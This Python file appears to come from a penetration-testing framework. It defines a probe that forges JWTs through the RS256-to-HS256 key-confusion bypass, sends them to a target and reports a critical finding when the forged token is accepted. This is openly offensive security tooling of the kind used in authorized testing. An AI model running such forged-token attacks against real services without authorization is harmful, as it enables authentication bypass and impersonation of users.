"""
JWT Algorithm Confusion Probe tool: tests the RS256->HS256 key-confusion
signature bypass (re-signs using the server's own RS256 public key as
the HMAC secret). Distinct from jwt_analyze's alg=none check. Glues
config/tools/jwt_algorithm_confusion_probe.yaml to
tradecraft.adapters.jwt_algorithm_confusion_probe.
"""
from __future__ import annotations

from typing import Any, Dict, List, Tuple
from urllib.parse import urlparse

from tradecraft.adapters.jwt_algorithm_confusion_probe import execute as confusion_execute
from tradecraft.adapters.jwt_algorithm_confusion_probe import parse as confusion_parse
from tradecraft.tools.base import Tool


class JwtAlgorithmConfusionProbe(Tool):
    tool_id = "jwt_algorithm_confusion_probe"

    def run(self, target: str, token: str, public_key: str) -> Dict[str, Any]:
        try:
            header, payload = confusion_execute.decode_jwt_claims(token)
        except ValueError as exc:
            return {"target": target, "error": f"invalid JWT: {exc}"}

        exact_token, normalized_token = confusion_execute.forge_hs256_confusion_tokens(header, payload, public_key)

        last_result: Dict[str, Any] = {"target": target, "error": "no signing variant could be tested"}
        for forged, variant in ((exact_token, "exact_pem"), (normalized_token, "normalized_pem")):
            diff = confusion_execute.run_differential(target, forged)
            if diff.error:
                last_result = {"target": target, "error": diff.error, "forged_token": forged}
                continue

            res = {"target": target, **confusion_parse.parse_result(diff.baseline_status, diff.forged_status)}
            res["forged_token"] = forged
            res["key_variant"] = variant
            res["_full_evidence"] = {
                "target": target,
                "original_header": header,
                "original_payload": payload,
                "forged_token": forged,
                "key_variant": variant,
                "baseline_status": diff.baseline_status,
                "forged_status": diff.forged_status,
                "vulnerable": res["vulnerable"],
            }
            if res["vulnerable"]:
                res["technique"] = "rs256_hs256_key_confusion"
                return res
            last_result = res

        return last_result

    def extract_evidence(self, params: Dict[str, Any], result: Dict[str, Any]) -> Tuple[str, Any] | None:
        target = params.get("target", "")
        full = result.pop("_full_evidence", None)
        if not target or full is None:
            return None
        parsed = urlparse(target)
        canonical_target = parsed.netloc or target
        return canonical_target, full

    def extract_facts(self, params: Dict[str, Any], result: Dict[str, Any]) -> List[Dict[str, Any]]:
        if not result.get("vulnerable"):
            return []
        target = params.get("target", "")
        parsed = urlparse(target)
        host = parsed.hostname or target
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        fact: Dict[str, Any] = {
            "host": host,
            "port": port,
            "vulnerability": "JWT RS256->HS256 key-confusion signature bypass",
            "severity": "critical",
        }
        if result.get("evidence_id"):
            fact["evidence"] = result["evidence_id"]
        return [fact]
